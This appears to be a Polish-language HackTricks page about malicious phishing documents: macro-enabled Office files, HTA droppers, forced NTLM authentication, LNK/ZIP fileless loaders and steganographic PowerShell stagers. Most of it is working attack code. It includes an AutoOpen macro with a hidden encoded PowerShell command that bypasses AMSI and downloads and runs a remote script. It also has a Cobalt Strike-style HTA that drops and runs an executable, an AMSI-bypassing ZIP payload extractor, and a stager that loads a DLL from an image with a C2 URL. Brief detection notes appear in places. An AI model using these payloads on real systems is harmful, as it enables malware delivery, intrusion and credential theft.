# Pliki i dokumenty phishingowe

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word wykonuje walidację danych pliku przed jego otwarciem. Walidacja danych polega na identyfikacji struktury danych zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi jakikolwiek błąd, analizowany plik nie zostanie otwarty.

Zazwyczaj pliki Word zawierające makra używają rozszerzenia `.docm`. Jednak możliwe jest zmienienie nazwy pliku przez zmianę rozszerzenia i wciąż zachowanie możliwości wykonywania makr.\
Na przykład plik RTF z założenia nie obsługuje makr, ale plik DOCM przemianowany na RTF będzie obsłużony przez Microsoft Word i będzie zdolny do wykonywania makr.\
Te same wewnętrzne mechanizmy dotyczą całego pakietu Microsoft Office (Excel, PowerPoint itp.).

Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą wykonywane przez niektóre programy Office:
```bash
assoc | findstr /i "word excel powerp"
```
Pliki DOCX odwołujące się do zdalnego szablonu (File –Options –Add-ins –Manage: Templates –Go), który zawiera macros, mogą również „wykonywać” macros.

### Ładowanie zewnętrznego obrazu

Przejdź do: _Insert --> Quick Parts --> Field_\
_**Kategorie**: Links and References, **Nazwy pól**: includePicture, oraz **Nazwa pliku lub URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Możliwe jest użycie macros do uruchomienia dowolnego kodu z dokumentu.

#### Funkcje autoload

Im bardziej powszechne, tym bardziej prawdopodobne, że AV je wykryje.

- AutoOpen()
- Document_Open()

#### Przykłady kodu macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ręczne usunięcie metadanych

Przejdź do **File > Info > Inspect Document > Inspect Document**, co otworzy Document Inspector. Kliknij **Inspect**, a następnie **Remove All** obok **Document Properties and Personal Information**.

#### Doc Extension

Po zakończeniu wybierz rozwijane menu **Save as type**, zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
Zrób to, ponieważ **can't save macro's inside a `.docx`** i istnieje pewne **stigma** **around** rozszerzenia macro-enabled **`.docm`** (np. ikona miniatury ma ogromne `!` i niektóre bramki web/email całkowicie je blokują). Dlatego to **legacy `.doc` extension is the best compromise**.

#### Generatory złośliwych macro's

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Pliki HTA

HTA jest programem Windows, który **combines HTML and scripting languages (such as VBScript and JScript)**. Generuje interfejs użytkownika i wykonuje się jako "fully trusted" aplikacja, bez ograniczeń modelu bezpieczeństwa przeglądarki.

HTA jest uruchamiane przy użyciu **`mshta.exe`**, które jest zazwyczaj **installed** razem z **Internet Explorer**, co sprawia, że **`mshta` dependant on IE**. Jeśli więc zostało ono odinstalowane, pliki HTA nie będą mogły zostać uruchomione.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Wymuszanie uwierzytelnienia NTLM

Istnieje kilka sposobów, aby **wymusić uwierzytelnienie NTLM "zdalnie"**, na przykład możesz dodać **niewidoczne obrazy** do wiadomości e-mail lub HTML, które użytkownik otworzy (nawet HTTP MitM?). Albo wysłać ofierze **adres plików**, który **wywoła** **uwierzytelnienie** już przy **otwarciu folderu.**

**Sprawdź te pomysły i więcej na następujących stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Pamiętaj, że nie tylko możesz ukraść hash lub uwierzytelnienie, ale także **przeprowadzić NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Bardzo skuteczne kampanie dostarczają ZIP zawierający dwa legalne dokumenty przynęty (PDF/DOCX) oraz złośliwy .lnk. Sztuczka polega na tym, że rzeczywisty loader PowerShell jest zapisany w surowych bajtach ZIP po unikatowym markerze, a .lnk wyodrębnia i uruchamia go całkowicie w pamięci.

Typowy przebieg realizowany przez .lnk PowerShell one-liner:

1) Zlokalizuj oryginalny ZIP w typowych ścieżkach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz katalogu nadrzędnym bieżącego katalogu roboczego.
2) Odczytaj bajty ZIP i znajdź zakodowany na stałe marker (np. xFIQCV). Wszystko po markerze to osadzony PowerShell payload.
3) Skopiuj ZIP do %ProgramData%, wypakuj tam i otwórz przynętę .docx, aby wyglądać na legalne.
4) Ominięcie AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskacja następnego etapu (np. usunięcie wszystkich znaków #) i wykonanie go w pamięci.

Przykładowy szkielet PowerShell do wyodrębnienia i uruchomienia osadzonego etapu:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notatki
- Delivery często wykorzystuje zaufane subdomeny PaaS (np. *.herokuapp.com) i może kontrolować dostęp do payloads (serwować nieszkodliwe ZIPy w zależności od IP/UA).
- Następny etap często deszyfruje base64/XOR shellcode i wykonuje go przez Reflection.Emit + VirtualAlloc, aby zminimalizować artefakty na dysku.

Persistence używane w tym samym łańcuchu
- COM TypeLib hijacking of the Microsoft Web Browser control tak, aby IE/Explorer lub każda aplikacja osadzająca go automatycznie ponownie uruchamiała payload. Zobacz szczegóły i gotowe do użycia polecenia tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Wyszukiwanie/IOCs
- Pliki ZIP zawierające dołączony do danych archiwum ASCII marker string (np. xFIQCV).
- .lnk, który enumeruje foldery nadrzędne/użytkownika, aby zlokalizować ZIP i otworzyć dokument przynęta.
- Modyfikacja AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Długotrwałe wątki biznesowe kończące się linkami hostowanymi pod zaufanymi domenami PaaS.

## Steganography-delimited payloads in images (PowerShell stager)

Ostatnie łańcuchy loaderów dostarczają obfuskowany JavaScript/VBS, który dekoduje i uruchamia Base64 PowerShell stager. Ten stager pobiera obraz (często GIF), który zawiera Base64-encoded .NET DLL ukrytą jako tekst jawny między unikalnymi markerami start/koniec. Skrypt wyszukuje te delimitery (przykłady z realnych kampanii: «<<sudo_png>> … <<sudo_odt>>>»), wycina tekst pomiędzy nimi, Base64-dekoduje go do bajtów, ładuje assembly w pamięci i wywołuje znaną metodę wejściową z URL C2.

Przebieg
- Stage 1: Archived JS/VBS dropper → dekoduje osadzony Base64 → uruchamia PowerShell stager z -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → pobiera obraz, wycina Base64 ograniczony markerami, ładuje .NET DLL w pamięci i wywołuje jego metodę (np. VAI), przekazując URL C2 i opcje.
- Stage 3: Loader pobiera finalny payload i zwykle wstrzykuje go przez process hollowing do zaufanego binarium (często MSBuild.exe). Zobacz więcej o process hollowing i trusted utility proxy execution tutaj:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Przykład PowerShell do wyciągnięcia DLL z obrazu i wywołania metody .NET w pamięci:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notatki
- To jest ATT&CK T1027.003 (steganography/marker-hiding). Markery różnią się między kampaniami.
- AMSI/ETW bypass i string deobfuscation są często stosowane przed załadowaniem assembly.
- Wykrywanie: przeskanuj pobrane obrazy w poszukiwaniu znanych delimiterów; zidentyfikuj PowerShell uzyskujący dostęp do obrazów i natychmiast dekodujący Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Powtarzającym się wstępnym etapem jest mały, mocno‑obfuskowany `.js` lub `.vbs` dostarczony w archiwum. Jego jedynym celem jest zdekodowanie osadzonego łańcucha Base64 i uruchomienie PowerShell z `-nop -w hidden -ep bypass`, aby zainicjować następny etap przez HTTPS.

Szkielet logiki (abstrakt):
- Odczytaj zawartość własnego pliku
- Zlokalizuj Base64 blob pomiędzy junk strings
- Zdekoduj do ASCII PowerShell
- Wykonaj za pomocą `wscript.exe`/`cscript.exe`, wywołując `powershell.exe`

Wskazówki do wykrywania
- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.

## Windows files to steal NTLM hashes

Sprawdź stronę o **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Referencje

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
